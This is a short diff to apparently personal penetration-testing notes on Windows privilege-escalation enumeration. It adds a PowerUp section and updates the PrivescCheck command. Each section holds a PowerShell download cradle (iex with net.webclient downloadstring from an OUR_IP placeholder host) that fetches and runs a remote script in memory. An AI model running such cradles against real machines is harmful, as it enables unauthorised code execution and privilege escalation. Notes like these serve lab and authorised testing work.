@@ -18,13 +18,22 @@ OR
 
     PowerSharpUp -SharpUp
 
-#### Alternate script: PrivescCheck
+#### Alternate script: PowerUp
+
+    iex(new-object net.webclient).downloadstring('http://OUR_IP/PowerUp.ps1')
+
+Then
+
+    Invoke-AllChecks
+
+#### Alternate Script: PrivescCheck
 
     iex(new-object net.webclient).downloadstring('http://OUR_IP/PrivescCheck.ps1')
 
 Then
 
-    Invoke-AllChecks
+    Invoke-PrivescCheck -Extended
+
 
 ### 2) Linux
 
